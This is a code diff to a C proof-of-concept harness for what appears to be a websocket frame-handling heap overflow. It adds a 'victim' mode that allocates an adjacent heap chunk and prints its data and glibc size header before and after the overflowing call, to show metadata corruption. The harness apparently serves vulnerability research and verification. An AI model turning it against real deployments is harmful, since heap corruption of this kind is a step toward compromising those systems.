@@ -173,6 +173,7 @@ int main(int argc, char **argv)
     const char *mode = argc > 1 ? argv[1] : "vuln";
     int safe = (strcmp(mode, "safe") == 0);
     int do_abort = (strcmp(mode, "abort") == 0);
+    int do_victim = (strcmp(mode, "victim") == 0);
     size_t payload_len = safe ? PAYLOAD_LEN_SHORT : PAYLOAD_LEN_FULL;
     const uint8_t mask[4] = { MASK0, MASK1, MASK2, MASK3 };
     wsh_t *wsh;
@@ -183,6 +184,8 @@ int main(int argc, char **argv)
     size_t usable;
 #ifdef PLAIN_MODE
     uint8_t snap[48], after[48];
+    uint8_t *victim = NULL;
+    uint8_t vsnap[24], vsize[8];
     size_t k;
 #endif
 
@@ -220,6 +223,17 @@ int main(int argc, char **argv)
      * are the bytes the 14-byte XOR extent (offsets 65536..65549) and the
      * NUL (offset 65536) can reach on a natural glibc layout. */
     memcpy(snap, wsh->bbuffer + BBUF_LEN, sizeof(snap));
+    if (do_victim) {
+        victim = (uint8_t *)malloc(128);
+        memset(victim, 0xC3, 128);
+        memcpy(snap, wsh->bbuffer + BBUF_LEN, sizeof(snap));
+        memcpy(vsnap, victim, sizeof(vsnap));
+        memcpy(vsize, victim - 8, sizeof(vsize));
+        fprintf(stderr, "VICTIM_OFF=%zd VICTIM_SIZE_BEFORE=",
+                victim - (uint8_t *)wsh->bbuffer);
+        for (k = 0; k < sizeof(vsize); k++) fprintf(stderr, "%02x", vsize[k]);
+        fprintf(stderr, "\n");
+    }
 #endif
 
     fprintf(stderr, "PRECALL PIN=%s MODE=%s PAYLOAD=%zu BBUFLEN=%zu USABLE=%zu MASK=%02x%02x%02x%02x\n",
@@ -232,6 +246,15 @@ int main(int argc, char **argv)
     /* Capture the post-frame bytes into stack immediately: any printf or
      * malloc here would perturb the very heap metadata being measured. */
     memcpy(after, wsh->bbuffer + BBUF_LEN, sizeof(after));
+    if (victim) {
+        fprintf(stderr, "VICTIM_DATA_BEFORE=");
+        for (k = 0; k < 8; k++) fprintf(stderr, "%02x", vsnap[k]);
+        fprintf(stderr, " VICTIM_DATA_AFTER=");
+        for (k = 0; k < 8; k++) fprintf(stderr, "%02x", victim[k]);
+        fprintf(stderr, " VICTIM_SIZE_AFTER=");
+        for (k = 0; k < sizeof(vsize); k++) fprintf(stderr, "%02x", victim[-8 + k]);
+        fprintf(stderr, "\n");
+    }
 #endif
 
     fprintf(stderr, "PIN=%s MODE=%s RV=%zd DATALEN=%zd RPLEN=%zd BBLEN=%zu USABLE=%zu OC=%d\n",
